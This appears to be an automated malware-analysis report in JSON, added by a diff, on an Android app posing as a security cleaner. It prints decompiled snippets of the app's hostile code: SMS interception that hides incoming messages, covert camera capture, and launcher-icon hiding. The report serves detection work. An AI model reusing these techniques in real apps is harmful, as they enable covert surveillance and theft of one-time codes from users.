@@ -1,0 +1,228 @@
+{
+  "APK信息": {
+    "文件名": "07d8a62621798b3072a4d241f105278487bedca911d175f01e84bb6ec1d4c828.apk",
+    "sha256": "07d8a62621798b3072a4d241f105278487bedca911d175f01e84bb6ec1d4c828",
+    "包名": "com.antivirus.sweet.clean",
+    "应用名": "Sweet Clean",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1084.3
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\dr\\avl\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    Object[] objArr = (Object[]) extras.get(\"pdus\");\n    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n    for (int i = 0; i < objArr.length; i++) {\n        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n    }\n    for (SmsMessage smsMessage : smsMessageArr) {\n        smsMessage.getDisplayOriginatingAddress();\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f764a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该 BroadcastReceiver 监听系统短信到达广播 android.provider.Telephony.SMS_RECEIVED，在收到短信时立即调用 abortBroadcast() 终止广播传播，使短信无法到达用户默认短信应用和系统通知栏，用户完全无感知；随后从 Intent extras 中提取 pdus 数据，通过 SmsMessage.createFromPdu() 解析短信内容并读取发送方号码。数据流向：系统短信广播（source）→ abortBroadcast() 隐藏短信 + 解析短信PDU提取发件人和内容（sink）。这种拦截短信行为通常用于窃取验证码/动态口令实施支付欺诈，或隐藏扣费订阅确认短信，结合厂商报告确认该样本伪装成安全工具实施数据窃取，属于明确的恶意短信拦截行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v4\\content\\WakefulBroadcastReceiver;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "public static ComponentName startWakefulService(Context context, Intent intent) {\n    synchronized (mActiveWakeLocks) {\n        int i = mNextId;\n        mNextId++;\n        if (mNextId <= 0) {\n            mNextId = 1;\n        }",
+          "malicious_code_snippet_context": "      private static final SparseArray<PowerManager.WakeLock> mActiveWakeLocks = new SparseArray<>();\n      private static int mNextId = 1;\n  \n>>>     public static ComponentName startWakefulService(Context context, Intent intent) {\n>>>         synchronized (mActiveWakeLocks) {\n>>>             int i = mNextId;\n>>>             mNextId++;\n>>>             if (mNextId <= 0) {\n>>>                 mNextId = 1;\n>>>             }\n              intent.putExtra(EXTRA_WAKE_LOCK_ID, i);\n              ComponentName componentNameStartService = context.startService(intent);\n              if (componentNameStartService == null) {",
+          "behavior_description": "该代码是 Android Support v4 库中 WakefulBroadcastReceiver 的标准实现。startWakefulService() 在启动服务时为每次调用分配唯一唤醒锁 ID（通过 EXTRA_WAKE_LOCK_ID 附加到 Intent 传递给目标服务），并持有 PARTIAL_WAKE_LOCK 唤醒锁，防止 CPU 在服务处理完成前进入休眠。数据流向：系统广播/定时事件(source) → startWakefulService() 持有 WakeLock 并启动后台服务(sink)。在该已确认的恶意广告样本（伪装安全工具，实为广告轰炸+数据收集）中，此机制被用作保活基础设施，确保恶意服务在设备休眠或被系统回收后仍能持续运行，支撑广告推送与隐私收集行为，属于典型的灰色保活手段；但代码本身为未修改的知名第三方库标准实现，无自定义恶意逻辑，风险为间接性。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcn\\sc\\sec\\act\\cmperdet;",
+          "method_signature": "uninstallApp(String str)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "private void uninstallApp(String str) {\n    startActivityForResult(new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + str)), 111);\n}\n\npublic void onActivityResult(int i, int i2, Intent intent) {\n    super.onActivityResult(i, i2, intent);\n    if (i == 111 && this.mInfo != null && !vz.b(this, this.mInfo.getPackageName())) {\n        afterUninstall();\n    }\n}",
+          "malicious_code_snippet_context": "          return super.onKeyDown(i, keyEvent);\n      }\n  \n>>>     private void uninstallApp(String str) {\n>>>         startActivityForResult(new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + str)), 111);\n>>>     }\n>>> \n>>>     /* JADX INFO: Access modifiers changed from: protected */\n>>>     @Override // android.support.v4.app.FragmentActivity, android.app.Activity\n>>>     public void onActivityResult(int i, int i2, Intent intent) {\n>>>         super.onActivityResult(i, i2, intent);\n>>>         if (i == 111 && this.mInfo != null && !vz.b(this, this.mInfo.getPackageName())) {\n>>>             afterUninstall();\n          }\n      }\n  ",
+          "behavior_description": "uninstallApp(String) 接收目标应用包名（来自应用内部扫描/检测结果 mInfo），构造 ACTION_DELETE Intent（Uri 为 package:包名）并通过 startActivityForResult 拉起系统卸载确认界面；onActivityResult 中检测到目标包已不存在（vz.b 返回 false）时调用 afterUninstall() 执行后续流程。数据流向：内部检测逻辑产生的包名(str) → 系统卸载 Intent(ACTION_DELETE)。需要指出：该方式会弹出系统卸载确认对话框，并非真正意义上的静默卸载（静默卸载需 root/设备管理员权限），但在已确认恶意的伪装安全类样本中，此模式常用于诱导用户卸载其他应用（如竞争安全软件），属于不需要的用户诱导行为，故判定为 grayware 而非 malicious",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE",
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cgl;",
+          "method_signature": "if(this.c != null && !this.c.isRecycled()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "cgl.this.f3857a = surfaceView.getHolder();\ncgl.this.f3857a.setType(3);\ncgl.this.a(cgl.this.f3857a);\nif (cgl.this.b != null) {\n    Thread.sleep(500L);\n    cgl.this.b.takePicture(null, null, cgl.this.k);\n}",
+          "malicious_code_snippet_context": "              public void run() {\n                  Looper.prepare();\n                  try {\n>>>                     cgl.this.f3857a = surfaceView.getHolder();\n>>>                     cgl.this.f3857a.setType(3);\n>>>                     cgl.this.a(cgl.this.f3857a);\n>>>                     if (cgl.this.b != null) {\n>>>                         Thread.sleep(500L);\n>>>                         cgl.this.b.takePicture(null, null, cgl.this.k);\n>>>                     } else {\n                          return;\n                      }\n                  } catch (Exception e) {",
+          "behavior_description": "该代码在名为 takePicture 的后台线程中通过 SurfaceHolder 初始化摄像头，静默等待500毫秒后自动调用 Camera.takePicture(null, null, callback) 完成拍照。关键特征：快门回调（ShutterCallback）传参为 null，拍照时无快门提示音，且整个流程在后台线程自动执行，无需用户任何交互，属于隐蔽拍照行为。数据流向为：摄像头传感器采集图像→ takePicture() 触发拍照→ JPEG 图像数据传入 PictureCallback 回调（this.k）的 onPictureTaken 方法，可被本地保存或进一步外传。结合该样本已被厂商确认存在秘密窃取用户数据的行为，此隐蔽拍照构成对用户视觉隐私的秘密采集与泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL",
+              "android.intent.action.DIAL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\facebook\\ads\\internal\\a\\c;",
+          "method_signature": "if(!TextUtils.isEmpty(strC)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "String strC = iVar.c(); if (!TextUtils.isEmpty(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) { return new Intent(\"android.intent.action.CALL\", Uri.parse(strC)); }",
+          "malicious_code_snippet_context": "String strC = iVar.c(); if (!TextUtils.isEmpty(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) { return new Intent(\"android.intent.action.CALL\", Uri.parse(strC)); }",
+          "behavior_description": "该代码位于Facebook Ads SDK内部的广告点击跳转处理逻辑。当广告被点击时，SDK解析广告配置对象中的目标链接（iVar.c()），若该链接以tel:或telprompt:开头，则直接构造ACTION_CALL意图发起电话呼叫。数据流向：远程广告服务器下发的广告链接配置→Intent ACTION_CALL直接拨号。由于使用的是ACTION_CALL而非ACTION_DIAL，若应用持有CALL_PHONE权限，可在不弹出拨号确认界面的情况下直接呼叫，广告主可通过配置tel:链接（如指向付费声讯号码）诱导或误触拨打电话造成话费损失。该行为属于广告SDK处理广告落地页的标准功能，且需用户点击广告触发，但在已确认的恶意广告类样本中构成潜在资费风险，判定为灰色行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cdy;",
+          "method_signature": "if(componentName == null)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static boolean a(Context context, ComponentName componentName, boolean z) {\n    if (componentName == null) { return false; }\n    try {\n        context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n        return true;\n    } catch (Exception e2) {\n        e2.printStackTrace();\n        return false;\n    }\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static boolean a(Context context, ComponentName componentName, boolean z) {\n>>>         if (componentName == null) {\n>>>             return false;\n>>>         }\n>>>         try {\n>>>             context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n>>>             return true;\n>>>         } catch (Exception e2) {\n>>>             e2.printStackTrace();\n>>>             return false;\n          }\n      }\n  ",
+          "behavior_description": "该方法封装了应用组件的启用/禁用切换逻辑。当参数 z 为 false 时，将传入的 componentName（通常为主启动 Activity 或其 alias）设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失，实现图标隐藏；当 z 为 true 时设置为 COMPONENT_ENABLED_STATE_DEFAULT(0) 恢复图标显示。数据流向：外部传入的 componentName（启动器组件）→ PackageManager.setComponentEnabledSetting() 禁用组件（sink），导致用户无法在桌面看到该应用，规避用户察觉与卸载，为样本后续的广告推送、数据收集等恶意行为提供隐蔽驻留条件。该样本已被厂商确认为伪装成安全工具的恶意应用，图标隐藏是其隐蔽驻留的典型手法。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
